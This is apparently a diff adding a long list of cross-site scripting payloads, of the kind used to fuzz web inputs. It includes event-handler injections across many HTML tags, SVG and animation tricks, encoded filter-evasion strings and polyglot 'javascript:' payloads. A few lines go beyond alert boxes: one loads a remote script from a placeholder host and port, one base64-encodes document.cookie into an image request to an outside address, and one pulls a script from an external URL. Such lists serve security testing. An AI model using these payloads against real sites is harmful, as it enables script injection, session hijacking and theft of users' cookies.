+<style>@keyframes x{}</style><html style="animation-name:x" onanimationend="alert(1)"></html>
+<style>@keyframes x{}</style><html style="animation-name:x" onanimationstart="alert(1)"></html>
+<style>@keyframes x{}</style><i style="animation-name:x" onanimationend="alert(1)"></i>
+<style>@keyframes x{}</style><i style="animation-name:x" onanimationstart="alert(1)"></i>
+<style>@keyframes x{}</style><iframe style="animation-name:x" onanimationend="alert(1)"></iframe>
+<style>@keyframes x{}</style><iframe style="animation-name:x" onanimationstart="alert(1)"></iframe>
+<style>@keyframes x{}</style><image style="animation-name:x" onanimationend="alert(1)"></image>
+<style>@keyframes x{}</style><image style="animation-name:x" onanimationstart="alert(1)"></image>
+<style>@keyframes x{}</style><img style="animation-name:x" onanimationend="alert(1)"></img>
+<style>@keyframes x{}</style><img style="animation-name:x" onanimationstart="alert(1)"></img>
+<style>@keyframes x{}</style><input style="animation-name:x" onanimationend="alert(1)"></input>
+<style>@keyframes x{}</style><input style="animation-name:x" onanimationstart="alert(1)"></input>
+<style>@keyframes x{}</style><ins style="animation-name:x" onanimationend="alert(1)"></ins>
+<style>@keyframes x{}</style><ins style="animation-name:x" onanimationstart="alert(1)"></ins>
+<style>@keyframes x{}</style><isindex style="animation-name:x" onanimationend="alert(1)"></isindex>
+<style>@keyframes x{}</style><isindex style="animation-name:x" onanimationstart="alert(1)"></isindex>
+<style>@keyframes x{}</style><kbd style="animation-name:x" onanimationend="alert(1)"></kbd>
+<style>@keyframes x{}</style><kbd style="animation-name:x" onanimationstart="alert(1)"></kbd>
+<style>@keyframes x{}</style><keygen style="animation-name:x" onanimationend="alert(1)"></keygen>
+<style>@keyframes x{}</style><keygen style="animation-name:x" onanimationstart="alert(1)"></keygen>
+<style>@keyframes x{}</style><label style="animation-name:x" onanimationend="alert(1)"></label>
+<style>@keyframes x{}</style><label style="animation-name:x" onanimationstart="alert(1)"></label>
+<style>@keyframes x{}</style><legend style="animation-name:x" onanimationend="alert(1)"></legend>
+<style>@keyframes x{}</style><legend style="animation-name:x" onanimationstart="alert(1)"></legend>
+<style>@keyframes x{}</style><li style="animation-name:x" onanimationend="alert(1)"></li>
+<style>@keyframes x{}</style><li style="animation-name:x" onanimationstart="alert(1)"></li>
+<style>@keyframes x{}</style><listing style="animation-name:x" onanimationend="alert(1)"></listing>
+<style>@keyframes x{}</style><listing style="animation-name:x" onanimationstart="alert(1)"></listing>
+<style>@keyframes x{}</style><main style="animation-name:x" onanimationend="alert(1)"></main>
+<style>@keyframes x{}</style><main style="animation-name:x" onanimationstart="alert(1)"></main>
+<style>@keyframes x{}</style><map style="animation-name:x" onanimationend="alert(1)"></map>
+<style>@keyframes x{}</style><map style="animation-name:x" onanimationstart="alert(1)"></map>
+<style>@keyframes x{}</style><mark style="animation-name:x" onanimationend="alert(1)"></mark>
+<style>@keyframes x{}</style><mark style="animation-name:x" onanimationstart="alert(1)"></mark>
+<style>@keyframes x{}</style><marquee style="animation-name:x" onanimationend="alert(1)"></marquee>
+<style>@keyframes x{}</style><marquee style="animation-name:x" onanimationstart="alert(1)"></marquee>
+<style>@keyframes x{}</style><menu style="animation-name:x" onanimationend="alert(1)"></menu>
+<style>@keyframes x{}</style><menu style="animation-name:x" onanimationstart="alert(1)"></menu>
+<style>@keyframes x{}</style><menuitem style="animation-name:x" onanimationend="alert(1)"></menuitem>
+<style>@keyframes x{}</style><menuitem style="animation-name:x" onanimationstart="alert(1)"></menuitem>
+<style>@keyframes x{}</style><meter style="animation-name:x" onanimationend="alert(1)"></meter>
+<style>@keyframes x{}</style><meter style="animation-name:x" onanimationstart="alert(1)"></meter>
+<style>@keyframes x{}</style><multicol style="animation-name:x" onanimationend="alert(1)"></multicol>
+<style>@keyframes x{}</style><multicol style="animation-name:x" onanimationstart="alert(1)"></multicol>
+<style>@keyframes x{}</style><nav style="animation-name:x" onanimationend="alert(1)"></nav>
+<style>@keyframes x{}</style><nav style="animation-name:x" onanimationstart="alert(1)"></nav>
+<style>@keyframes x{}</style><nextid style="animation-name:x" onanimationend="alert(1)"></nextid>
+<style>@keyframes x{}</style><nextid style="animation-name:x" onanimationstart="alert(1)"></nextid>
+<style>@keyframes x{}</style><nobr style="animation-name:x" onanimationend="alert(1)"></nobr>
+<style>@keyframes x{}</style><nobr style="animation-name:x" onanimationstart="alert(1)"></nobr>
+<style>@keyframes x{}</style><noscript style="animation-name:x" onanimationend="alert(1)"></noscript>
+<style>@keyframes x{}</style><noscript style="animation-name:x" onanimationstart="alert(1)"></noscript>
+<style>@keyframes x{}</style><object style="animation-name:x" onanimationend="alert(1)"></object>
+<style>@keyframes x{}</style><object style="animation-name:x" onanimationstart="alert(1)"></object>
+<style>@keyframes x{}</style><ol style="animation-name:x" onanimationend="alert(1)"></ol>
+<style>@keyframes x{}</style><ol style="animation-name:x" onanimationstart="alert(1)"></ol>
+<style>@keyframes x{}</style><optgroup style="animation-name:x" onanimationend="alert(1)"></optgroup>
+<style>@keyframes x{}</style><optgroup style="animation-name:x" onanimationstart="alert(1)"></optgroup>
+<style>@keyframes x{}</style><option style="animation-name:x" onanimationend="alert(1)"></option>
+<style>@keyframes x{}</style><option style="animation-name:x" onanimationstart="alert(1)"></option>
+<style>@keyframes x{}</style><output style="animation-name:x" onanimationend="alert(1)"></output>
+<style>@keyframes x{}</style><output style="animation-name:x" onanimationstart="alert(1)"></output>
+<style>@keyframes x{}</style><p style="animation-name:x" onanimationend="alert(1)"></p>
+<style>@keyframes x{}</style><p style="animation-name:x" onanimationstart="alert(1)"></p>
+<style>@keyframes x{}</style><picture style="animation-name:x" onanimationend="alert(1)"></picture>
+<style>@keyframes x{}</style><picture style="animation-name:x" onanimationstart="alert(1)"></picture>
+<style>@keyframes x{}</style><plaintext style="animation-name:x" onanimationend="alert(1)"></plaintext>
+<style>@keyframes x{}</style><plaintext style="animation-name:x" onanimationstart="alert(1)"></plaintext>
+<style>@keyframes x{}</style><pre style="animation-name:x" onanimationend="alert(1)"></pre>
+<style>@keyframes x{}</style><pre style="animation-name:x" onanimationstart="alert(1)"></pre>
+<style>@keyframes x{}</style><progress style="animation-name:x" onanimationend="alert(1)"></progress>
+<style>@keyframes x{}</style><progress style="animation-name:x" onanimationstart="alert(1)"></progress>
+<style>@keyframes x{}</style><q style="animation-name:x" onanimationend="alert(1)"></q>
+<style>@keyframes x{}</style><q style="animation-name:x" onanimationstart="alert(1)"></q>
+<style>@keyframes x{}</style><rb style="animation-name:x" onanimationend="alert(1)"></rb>
+<style>@keyframes x{}</style><rb style="animation-name:x" onanimationstart="alert(1)"></rb>
+<style>@keyframes x{}</style><rt style="animation-name:x" onanimationend="alert(1)"></rt>
+<style>@keyframes x{}</style><rt style="animation-name:x" onanimationstart="alert(1)"></rt>
+<style>@keyframes x{}</style><rtc style="animation-name:x" onanimationend="alert(1)"></rtc>
+<style>@keyframes x{}</style><rtc style="animation-name:x" onanimationstart="alert(1)"></rtc>
+<style>@keyframes x{}</style><ruby style="animation-name:x" onanimationend="alert(1)"></ruby>
+<style>@keyframes x{}</style><ruby style="animation-name:x" onanimationstart="alert(1)"></ruby>
+<style>@keyframes x{}</style><s style="animation-name:x" onanimationend="alert(1)"></s>
+<style>@keyframes x{}</style><s style="animation-name:x" onanimationstart="alert(1)"></s>
+<style>@keyframes x{}</style><samp style="animation-name:x" onanimationend="alert(1)"></samp>
+<style>@keyframes x{}</style><samp style="animation-name:x" onanimationstart="alert(1)"></samp>
+<style>@keyframes x{}</style><script style="animation-name:x" onanimationend="alert(1)"></script>
+<style>@keyframes x{}</style><script style="animation-name:x" onanimationstart="alert(1)"></script>
+<style>@keyframes x{}</style><section style="animation-name:x" onanimationend="alert(1)"></section>
+<style>@keyframes x{}</style><section style="animation-name:x" onanimationstart="alert(1)"></section>
+<style>@keyframes x{}</style><select style="animation-name:x" onanimationend="alert(1)"></select>
+<style>@keyframes x{}</style><select style="animation-name:x" onanimationstart="alert(1)"></select>
+<style>@keyframes x{}</style><shadow style="animation-name:x" onanimationend="alert(1)"></shadow>
+<style>@keyframes x{}</style><shadow style="animation-name:x" onanimationstart="alert(1)"></shadow>
+<style>@keyframes x{}</style><slot style="animation-name:x" onanimationend="alert(1)"></slot>
+<style>@keyframes x{}</style><slot style="animation-name:x" onanimationstart="alert(1)"></slot>
+<style>@keyframes x{}</style><small style="animation-name:x" onanimationend="alert(1)"></small>
+<style>@keyframes x{}</style><small style="animation-name:x" onanimationstart="alert(1)"></small>
+<style>@keyframes x{}</style><source style="animation-name:x" onanimationend="alert(1)"></source>
+<style>@keyframes x{}</style><source style="animation-name:x" onanimationstart="alert(1)"></source>
+<style>@keyframes x{}</style><spacer style="animation-name:x" onanimationend="alert(1)"></spacer>
+<style>@keyframes x{}</style><spacer style="animation-name:x" onanimationstart="alert(1)"></spacer>
+<style>@keyframes x{}</style><span style="animation-name:x" onanimationend="alert(1)"></span>
+<style>@keyframes x{}</style><span style="animation-name:x" onanimationstart="alert(1)"></span>
+<style>@keyframes x{}</style><strike style="animation-name:x" onanimationend="alert(1)"></strike>
+<style>@keyframes x{}</style><strike style="animation-name:x" onanimationstart="alert(1)"></strike>
+<style>@keyframes x{}</style><strong style="animation-name:x" onanimationend="alert(1)"></strong>
+<style>@keyframes x{}</style><strong style="animation-name:x" onanimationstart="alert(1)"></strong>
+<style>@keyframes x{}</style><sub style="animation-name:x" onanimationend="alert(1)"></sub>
+<style>@keyframes x{}</style><sub style="animation-name:x" onanimationstart="alert(1)"></sub>
+<style>@keyframes x{}</style><summary style="animation-name:x" onanimationend="alert(1)"></summary>
+<style>@keyframes x{}</style><summary style="animation-name:x" onanimationstart="alert(1)"></summary>
+<style>@keyframes x{}</style><sup style="animation-name:x" onanimationend="alert(1)"></sup>
+<style>@keyframes x{}</style><sup style="animation-name:x" onanimationstart="alert(1)"></sup>
+<style>@keyframes x{}</style><svg style="animation-name:x" onanimationend="alert(1)"></svg>
+<style>@keyframes x{}</style><svg style="animation-name:x" onanimationstart="alert(1)"></svg>
+<style>@keyframes x{}</style><table style="animation-name:x" onanimationend="alert(1)"></table>
+<style>@keyframes x{}</style><table style="animation-name:x" onanimationstart="alert(1)"></table>
+<style>@keyframes x{}</style><tbody style="animation-name:x" onanimationend="alert(1)"></tbody>
+<style>@keyframes x{}</style><tbody style="animation-name:x" onanimationstart="alert(1)"></tbody>
+<style>@keyframes x{}</style><td style="animation-name:x" onanimationend="alert(1)"></td>
+<style>@keyframes x{}</style><td style="animation-name:x" onanimationstart="alert(1)"></td>
+<style>@keyframes x{}</style><textarea style="animation-name:x" onanimationend="alert(1)"></textarea>
+<style>@keyframes x{}</style><textarea style="animation-name:x" onanimationstart="alert(1)"></textarea>
+<style>@keyframes x{}</style><tfoot style="animation-name:x" onanimationend="alert(1)"></tfoot>
+<style>@keyframes x{}</style><tfoot style="animation-name:x" onanimationstart="alert(1)"></tfoot>
+<style>@keyframes x{}</style><th style="animation-name:x" onanimationend="alert(1)"></th>
+<style>@keyframes x{}</style><th style="animation-name:x" onanimationstart="alert(1)"></th>
+<style>@keyframes x{}</style><thead style="animation-name:x" onanimationend="alert(1)"></thead>
+<style>@keyframes x{}</style><thead style="animation-name:x" onanimationstart="alert(1)"></thead>
+<style>@keyframes x{}</style><time style="animation-name:x" onanimationend="alert(1)"></time>
+<style>@keyframes x{}</style><time style="animation-name:x" onanimationstart="alert(1)"></time>
+<style>@keyframes x{}</style><tr style="animation-name:x" onanimationend="alert(1)"></tr>
+<style>@keyframes x{}</style><tr style="animation-name:x" onanimationstart="alert(1)"></tr>
+<style>@keyframes x{}</style><track style="animation-name:x" onanimationend="alert(1)"></track>
+<style>@keyframes x{}</style><track style="animation-name:x" onanimationstart="alert(1)"></track>
+<style>@keyframes x{}</style><tt style="animation-name:x" onanimationend="alert(1)"></tt>
+<style>@keyframes x{}</style><tt style="animation-name:x" onanimationstart="alert(1)"></tt>
+<style>@keyframes x{}</style><u style="animation-name:x" onanimationend="alert(1)"></u>
+<style>@keyframes x{}</style><u style="animation-name:x" onanimationstart="alert(1)"></u>
+<style>@keyframes x{}</style><ul style="animation-name:x" onanimationend="alert(1)"></ul>
+<style>@keyframes x{}</style><ul style="animation-name:x" onanimationstart="alert(1)"></ul>
+<style>@keyframes x{}</style><var style="animation-name:x" onanimationend="alert(1)"></var>
+<style>@keyframes x{}</style><var style="animation-name:x" onanimationstart="alert(1)"></var>
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="alert(1)"></video>
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationstart="alert(1)"></video>
+<style>@keyframes x{}</style><wbr style="animation-name:x" onanimationend="alert(1)"></wbr>
+<style>@keyframes x{}</style><wbr style="animation-name:x" onanimationstart="alert(1)"></wbr>
+<style>@keyframes x{}</style><xmp style="animation-name:x" onanimationend="alert(1)"></xmp>
+<style>@keyframes x{}</style><xmp style="animation-name:x" onanimationstart="alert(1)"></xmp>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
+<svG/x=">"/oNloaD=alert()//
+<svg </onload ="1> (_=alert,_(1)) "">
+<svg contentScriptType=text/vbs><script>MsgBox+1
+<svg id=javascript:alert(10) onload=location=id>
+<svg onload="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162'] ('\141\154\145\162\164\50\61\51')()">
+<svg onload="alert(1)"
+<svg onload=alert&#0000000040document.domain)>
+<svg onload=alert&#x000000028;document.domain)>
+<svg onload=alert(1)//
+<svg onload=alert(1)>
+<svg onload=alert(1)>\
+<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+<svg onload=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='));>
+<svg onx=() onload=(alert)(1)>
+<svg xmlns="#"><script>alert(1)</script></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
+<svg/OnLoad="`${alert``}`">
+<svg/on<script><script>load=alert(1)//</script>
+<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert() to=&>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+<svg><b><style><img id="</style><img src=1 onerror=alert(1)>">
+<svg><image href=1 onerror=alert(1)>
+<svg><path><animateMotion onbegin=alert(1) dur="1s" repeatCount="1">
+<svg><script ?>alert(1)
+<svg><script onlypossibleinopera:-)> alert(1)
+<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+<svg><script xlink:href="{ASCII}data:,alert(1)"></script></svg>
+<svg><script xlink:href=data:,alert(1) />
+<svg><script xlink:href=data:,window.open('https://www.google.com/') </script
+<svg><script xlink:href=data:,window.open('https://www.google.com/')></script
+<svg><script>//%0a%0dalert(1);</script </svg>
+<svg><set onbegin=alert(1) attributename=x dur=1s>
+<svg><set onbegin=alert(1)>
+<svg><style>{font-family:'<iframe/onload=alert(1)>'
+<svg><svg onload=alert(1)>
+<video onerror="javascript:alert(1)"><source>
+<video onloadstart=alert(1)><source>
+<video src/onerror=alert(1)>
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<video src=1 onerror=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video><source onerror=alert(1) src=1></video>
+<video><source/*aa*/onerror="javascript:alert('xss')">
+<video><track default onload=alert(1) src="data:text/vtt,WEBVTT"></video>
+<x onanimationend=alert(1)><style>x{animation:s}@keyframes s{}
+<x onwebkitanimationend=alert(1)><style>x{animation:s}@keyframes s{}
+<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
+='><script>alert("xss")</script>
+> <script>alert(4)</script>
+>"><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>
+>"><script>alert("XSS")</script>&
+></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+><svg onload=alert(1)>?a=reader
+?p[<script>`]=`/alert(1)</script>
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(
+String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>
+Tarun~<"><details/open/ontoggle="jAvAsCrIpT:alert(/xss-by-tarun/)">XXXXX</a>
+\";alert('XSS');//
+\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
+\u224B "><!'/*"*\'/*"/*--></Script><Image SrcSet=K */; OnError=alert(document.domain) //># \u224B
+`"'><img src='#' onerror=javascript:alert(1)>
+`"'><img src=xxx:x  onerror=javascript:alert(1)>
+`"'><img src=xxx:x %0Conerror=javascript:alert(1)>
+`"'><img src=xxx:x %0donerror=javascript:alert(1)>
+`"'><img src=xxx:x onerror =javascript:alert(1)>
+`"'><img src=xxx:x onerror%0C=javascript:alert(1)>
+`"'><img src=xxx:x onerror%0d=javascript:alert(1)>
+`> <script>alert(5)</script>
+a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
+alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+alert(String.fromCharCode(88,83,83));'))">
+alert.apply(null, [1])
+anythinglr00</script><script>alert(document.domain)</script>uxldz
+attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>"></BODY></HTML>
+attributeName="innerHTML" to="XSS<SCRIPT DEFER>javascript:alert(1)</SCRIPT>"></BODY></HTML>
+attributename="innerhtml" to="xss<script defer>alert('xss')</script>"> </body></html>
+data:text/html,<img src=1 onerror=alert(1)>
+document.write(atob('PGltZyBzcmM9aHR0cDovL2xvY2FsaG9zdDo4MDkvcD89') + btoa(document.cookie) + '>')
+element[attribute='<img src=x onerror=alert('XSS');>
+eval('al'+'ert'+'(12)');//
+foo<script>alert(1)</script>
+foo<script>alert(document.cookie)</script>
+httP://aa"><script>alert(123)</script>
+httP://aa'><script>alert(123)</script>
+httP://aa<script>alert(123)</script>
+jaVasCript:/*`/*\`/*'/*\"//"/**/(onload=alert())//<svg/onload=alert()><frame/onload=alert()></select></noscript></noembed></template></stYle/</titLe/</teXtarEa/</script/--><sVg/oNloAd= alert()//>
+javascript:"/*'/*\"/*` /**/alert()//--></title></textarea></style></noscript></noembed></template></script><script>alert()</script><svg/<frame/onload=alert()>
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//>
+javascript:"/*'//`//\"//</template/</title/</textarea/</style/</noscript/</noembed/</script/--><script>/<i<frame */ onload=alert()//</script>
+javascript:"/*'//`//\"//</title></template/</textarea/</style/</noscript/</noembed/</script>--><<script>alert()<</script><frame/*/ onload=alert()//>
+javascript:"/*\"/*'/*--></title></textarea></style></noscript></template></noembed></script><<script>/*` /*<frame src=javascript:/**/alert()//><</script>
+javascript:"/*\"/*'/*`/*--></noembed></template></noscript></title></textarea></style></script></select><frame/onload=alert()><<svg/onload= /**/alert()//>
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg onload=/*<html/*/onmouseover=alert()//>
+javascript:"/*`/*\"/*' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert()//--><<sVg/onload=alert``>
+javascript:"/*`/*\"/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*<i<frame/*/ onload=alert()//</Script>
+javascript:'/*`/*'/*"/*\"/*<FRAME SRC= javascript:/**/-alert()//--></title></textarea></style></noscript></noembed></template></script><script>//<svg onload= alert()//</script>
+javascript:/*"/*'/*\"/*`/*--></title></noembed></template></textarea></noscript></style></script><script>//<frame <svg */ onload=alert()//</script>
+javascript:/*"/*'/*\"/*`/*><frame src=javascript:alert()></template </textarea </title </style </noscript </noembed </script --><<script>alert()<</script>\ /**/alert()//
+javascript:/*"/*'/*`/*\"/**/ alert()//*</title></textarea></style></noscript></noembed></template></option></select></SCRIPT>--><<svg onload=alert()><frame src=javascript:alert()>
+javascript:/*"/*'/*`/*\"/*</script/</title/</textarea/</style/</noscript></template></noembed>--><script>/*<svg <frame */ onload=alert()//</script>
+javascript:/*"/*\"/*`/*'/**/ (alert())//</title></textarea></style></noscript></script></noembed></template></select><frame src=javascript:alert()--><<svg/onload=alert()>
+javascript:/*"/*`/*'/*\"/*-->*/ alert()//</title></textarea></style></noscript></noembed></template></script></select><frame/onload=alert``><<svg/onload=alert()>
+javascript:/*"/*`/*'/*\"/*--></title></script></textarea></noscript></style></noembed></template><script> /*<svg <frame onload=/**/alert()//</script>
+javascript:/*"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script><<script> /**/alert()//<</script><frame onload=alert()>
+javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><frame/onload=alert()--><<svg/*/ onload=alert()//>
+javascript:/*"//'//`//\"//--></script></title></style></textarea></template></noembed></noscript><script>//<frame/<svg/*/onload= alert()//</script>
+javascript:/*-->'//"//`//\"//</title></textarea></style></noscript></script></noembed></template><script>/*<frame/<svg */ onload=alert()//</script>
+javascript:/*--></script></textarea></style></noscript>\"</noembed>[`</template>["</select>['</title>]<<script>///<frame */ onload=alert()//<</script>
+javascript:/*--></title></style></template></noscript></noembed></textarea></script><svg/onload='+/"/+/onclick=1/+/[*/[]/+alert()//'>"><svg/onload=`+/"/+/onclick=/+/[*/[]/+alert()//'>"><script>alert()</script><frame src="javascript:alert()"></frameset>+\"; alert()//<img src onerror=alert()>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+javascript:/*`/*'/*'/*"-/*\"/**/ alert()//></title></textarea></style></select></script></noembed></noscript></template>--><<svg/onload=alert()><frame/src=javascript:alert()>
+javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame <svg"///*/ onload=alert()//</script>
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:`/*</title></style></textarea></noscript></script></noembed></template></select/"/'/*--><frame onload=alert()><svg/\"/*<svg onload=' /**/-alert()//'>javascript:/*`/*\"/*'/*</noembed>"/*<frame src=javascript:/**/;alert()//--></title></textarea></style></noscript></template></select></script><<svg/onload= alert()//>
+javascript:`/*\"/*--><svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>`
+javascript:`</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript><<script/>/<frame */; onload=alert()//<</script>`
+javascript:alert("hellox worldss")
+javascript:alert()"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//<svg <frame */onload= alert()//</script>
+javascript:alert()//"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script>*/ alert()//<frame onload=alert()><<script>alert()<</script>
+javascript:alert()//'//"//\"//-->`//*/ alert();//</title></textarea></style></noscript></noembed></template><frame onload=alert()></select></script><<svg onload=alert()>
+javascript:alert()//'//"//\"; '/`/*\/*'/*"/**/(alert())//</style></template/</title/</textarea/</noscript/</noembed/</script>--><frame <svg onload=alert()><script>alert()</script>
+javascript:alert()//'//"//`//></a></option></select></template></noscript></script></title></style></textarea></noembed>--><<svg onload=alert()>\">alert()//*/ alert()//<frame src=javascript:alert()>
+javascript:alert()//*-->*`/*'/*"/*\"/*</title></textarea></style></noscript></noembed></template><frame src=javascript:alert()></script><script>/*<svg onload=alert()>*/ alert()//</script>
+javascript:alert()//*/alert()/*'-/"/-eval(`(alert())`)//\"-alert()//--></title></style></noscript></textarea></template></noembed><script>alert()</script><frameset onload=alert()><svg/onload=alert(1)> alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+javascript:alert()//--></title></style></noscript></noembed></template></select></textarea><frameset onload=alert()></script>*///\"//`//'//"//><svg <svg onload=alert()> alert()//
+javascript:alert()//</title></style></textarea></noscript></template></noembed><script>alert()</script>-->\";alert()//";alert()//';alert()//<script>alert()</script><frame src="javascript:alert()">` alert()//<svg/onload=alert()>*/alert()/*
+javascript:alert()//<frame/src=javascript:alert()><svg/onload=alert()>`;alert()`';alert()//\";alert();//"//--></title></textarea></style></noscript></noembed></template></option></select></script><svg onload=alert()>*/ alert()//*
+javascript:alert()//\ /*<svg/onload=';alert();'></textarea></style></title></noscript></template></noembed><frame onload=";alert();"></script>--><script>alert`;alert();`</script>*/alert()//\";alert()//
+javascript:alert()//\"//`//'//"//--></style></select></noscript></noembed></template></title></textarea></script><iframe/srcdoc="<svg/onload=alert()>"><frame/onload=alert()>*/ alert()//
+javascript:alert()//\";alert();/*-/*`/*\`/*'/*"/**///--><FRAME SRC="javascript:alert();"></textarea></style></noscript></noembed></template></option></select></script></title><svg/onload=alert()><svg/onload=alert()> alert(1)//
+javascript:alert();//</title></noscript></noembed></template></style></textarea><frameset onload='+/"/+/[*/[]/+alert()//'-->\" alert();/*`/**/(/**/alert())//<script>alert()</script><<svg onload=alert()>>
+javascript:alert();//<img src=x:x onerror=alert(1)>\";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!--
+javascript:alert(1)//\";alert(1);<!--jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)//
+javascript:alert/*`/*\/*'/*\"/*"/**/(alert())// alert()//--></template><frame/onload=alert() <img src=x onerror=alert()></style/</title/</textarea/</noscript/</noembed/</script><script>alert()</script>
+javascript:setInterval('ale'+'rt(document.domain)')
+sometext<svg onload=alert(document.domain)>?mimeType=text/html
+window[document.body.innerText.charAt(document.body.innerText.indexOf('a'))+'lert'](1)
+x"</title><img src=x onerror=alert(1)>
+x;</script><script>new class extends alert(1){}</script>
+xyz onerror=alert(6);
+}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+“><<script>alert(document.cookie);//<</script>
+“><ScRiPt>alert(document.cookie)</script>
